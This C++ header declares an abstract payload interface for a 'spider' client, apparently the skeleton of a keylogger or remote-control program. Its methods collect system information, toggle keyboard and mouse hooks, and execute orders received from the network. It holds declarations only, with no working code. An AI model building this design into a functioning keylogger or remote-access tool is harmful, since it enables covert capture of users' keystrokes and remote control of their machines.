#pragma once

#include <string>
#include "SystemInfo.h"
#include "SystemMsg.h"
#include "Queue.h"

namespace spider
{
namespace client
{
namespace library
{
class IPayload
{
public:
  using Order = std::string;

  virtual ~IPayload() = default;

  // Should initialize the payload, if needed
  virtual bool init(mt::Queue<SystemMsg> &inputQueue) = 0;

  // Get the event thread-safe queue, in order to control the client
  virtual mt::Queue<Order> &getOrderQueue() = 0;

  // Should de-initialize the payload, if needed
  virtual bool deinit() = 0;

  // Collect informations about the system
  virtual void getInfos() = 0;

  // Toggle Keyboard hook
  virtual bool getKeyboard() = 0;

  // Toggle Mouse hook
  virtual bool getMouse() = 0;

  // Execute all the actions needed
  virtual void run() = 0;

  // Execute an order received from the network
  virtual void exec(Order const &) = 0;
};
}
}
}